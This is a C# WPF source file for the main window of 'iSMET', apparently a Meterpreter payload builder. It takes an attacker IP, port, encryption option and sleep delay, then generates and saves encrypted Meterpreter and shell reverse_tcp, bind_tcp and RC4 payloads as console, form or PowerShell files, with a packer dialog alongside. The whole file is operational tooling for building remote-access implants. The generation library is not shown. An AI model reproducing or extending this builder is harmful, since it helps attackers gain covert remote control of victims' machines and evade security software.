using FirstFloor.ModernUI.Windows.Controls;
using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;

namespace iSMET
{
    /// <summary>
    /// Interaction logic for Main.xaml
    /// </summary>
    public partial class Main : ModernWindow
    {
        private bool isBindTcp = false;
        private CSharpLibrary.FormApplication createFormApp = new CSharpLibrary.FormApplication();
        private CSharpLibrary.ConsoleApplication createConsoleApp = new CSharpLibrary.ConsoleApplication();
        private CSharpLibrary.Powershell createPowershell = new CSharpLibrary.Powershell();
        public Main()
        {
            InitializeComponent();
        }
        private void btnBuilder_Click(object sender, RoutedEventArgs e)
        {
			if (!string.IsNullOrEmpty(txtIP.Text))
			{
				if (!string.IsNullOrEmpty(txtPort.Text))
				{
					if (cmbPayload.SelectedIndex == 0)
					{
						if (cmbType.SelectedIndex == 0)
						{
							txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
							createConsoleApp.ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
							else
							{
								if (cmbType.SelectedIndex == 2)
								{
									createPowershell.ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
									txtStatus.AppendText(
                                        $"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
									txtStatus.AppendText(
                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createPowershell.FileName}");
								}
							}
						}
					}
					else
					{
						if (cmbPayload.SelectedIndex == 1)
						{
							if (cmbType.SelectedIndex == 0)
							{
								createConsoleApp.ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText(
                                    $"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated.");
								txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
							}
							else
							{
								if (cmbType.SelectedIndex == 1)
								{
									createFormApp.ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
									txtStatus.AppendText(
                                        $"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated.");
									txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
									txtStatus.AppendText(
                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
								}
							}
						}
						else
						{
							if (cmbPayload.SelectedIndex == 3)
							{
								if (cmbType.SelectedIndex == 0)
								{
									createConsoleApp.ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
									txtStatus.AppendText(
                                        $"{Environment.NewLine}meterpreter/shell/reverse_tcp payload generated.");
									txtStatus.AppendText(
                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
								}
								else
								{
									createFormApp.ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
									txtStatus.AppendText(
                                        $"{Environment.NewLine}meterpreter/shell/reverse_tcp payload generated.");
									txtStatus.AppendText(
                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
								}
							}
							else
							{
								if (cmbPayload.SelectedIndex == 4)
								{
									if (cmbType.SelectedIndex == 0)
									{
										createConsoleApp.ShellReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
										txtStatus.AppendText(
                                            $"{Environment.NewLine}meterpreter/shell/reverse_tcp_rc4 payload generated.");
										txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
										txtStatus.AppendText(
                                            $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
									}
									else
									{
										if (cmbType.SelectedIndex == 1)
										{
											createFormApp.ShellReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
											txtStatus.AppendText(
                                                $"{Environment.NewLine}meterpreter/shell/reverse_tcp_rc4 payload generated.");
											txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
											txtStatus.AppendText(
                                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
										}
									}
								}
								else
								{
									if (cmbPayload.SelectedIndex == 7)
									{
										if (cmbType.SelectedIndex == 0)
										{
											createConsoleApp.x64ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
											txtStatus.AppendText(
                                                $"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated.");
											txtStatus.AppendText(
                                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
										}
										else
										{
											if (cmbType.SelectedIndex == 1)
											{
												createFormApp.x64ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
												txtStatus.AppendText(
                                                    $"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated.");
												txtStatus.AppendText(
                                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
											}
										}
									}
									else
									{
										if (cmbPayload.SelectedIndex == 8)
										{
											if (cmbType.SelectedIndex == 0)
											{
												createConsoleApp.x64ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
												txtStatus.AppendText(
                                                    $"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
												txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
												txtStatus.AppendText(
                                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
											}
											else
											{
												if (cmbType.SelectedIndex == 1)
												{
													createFormApp.x64ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
													txtStatus.AppendText(
                                                        $"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
													txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
													txtStatus.AppendText(
                                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
												}
											}
										}
										else
										{
											if (cmbPayload.SelectedIndex == 10)
											{
												if (cmbType.SelectedIndex == 0)
												{
													createConsoleApp.x64ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
													txtStatus.AppendText(
                                                        $"{Environment.NewLine}x64/shell/reverse_tcp payload generated.");
													txtStatus.AppendText(
                                                        $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
												}
												else
												{
													if (cmbType.SelectedIndex == 1)
													{
														createFormApp.x64ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
														txtStatus.AppendText(
                                                            $"{Environment.NewLine}x64/shell/reverse_tcp payload generated.");
														txtStatus.AppendText(
                                                            $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				else
				{
					txtStatus.AppendText($"{Environment.NewLine}Port can not be empty");
				}
			}
			else
			{
				if (isBindTcp)
				{
					if (cmbPayload.SelectedIndex == 2)
					{
						if (cmbType.SelectedIndex == 0)
						{
							createConsoleApp.BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated.");
							txtStatus.AppendText(
                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated.");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
						}
					}
					if (cmbPayload.SelectedIndex == 5)
					{
						if (cmbType.SelectedIndex == 0)
						{
							createConsoleApp.ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated.");
							txtStatus.AppendText(
                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated.");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
						}
					}
					if (cmbPayload.SelectedIndex == 6)
					{
						if (cmbType.SelectedIndex == 0)
						{
							createConsoleApp.ShellBindTcpRc4(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated.");
							txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
							txtStatus.AppendText(
                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.ShellBindTcpRc4(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated.");
								txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
						}
					}
					if (cmbPayload.SelectedIndex == 9)
					{
						if (cmbType.SelectedIndex == 0)
						{
							createConsoleApp.x64BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated.");
							txtStatus.AppendText(
                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.x64BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText(
                                    $"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated.");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
						}
					}
					if (cmbPayload.SelectedIndex == 11)
					{
						if (cmbType.SelectedIndex == 0)
						{
							createConsoleApp.x64ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated.");
							txtStatus.AppendText(
                                $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createConsoleApp.FileName}");
						}
						else
						{
							if (cmbType.SelectedIndex == 1)
							{
								createFormApp.x64ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
								txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated.");
								txtStatus.AppendText(
                                    $"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createFormApp.fileName}");
							}
						}
					}
				}
				else
				{
					txtStatus.AppendText($"{Environment.NewLine}IP address can not be empty");
				}
			}
		}
        private void ModernWindow_Loaded(object sender, RoutedEventArgs e)
        {
            cmbPayload.SelectedIndex = 0;
            cmbEncryption.SelectedIndex = 0;
            cmbType.SelectedIndex = 0;
            txtStatus.Text =
                $"iSMET - (A)Symmetric Meterpreter Encryption Tool{Environment.NewLine}Eyüp Çelik - @mindspoof - http://eyupcelik.com.tr{Environment.NewLine}Privia Security @Priviasec - https://priviasecurity.com";
        }
        private void btnPacker_Click(object sender, RoutedEventArgs e)
        {
			var ismetPacker = new Packer();
			ismetPacker.ShowDialog();
        }
	}
}
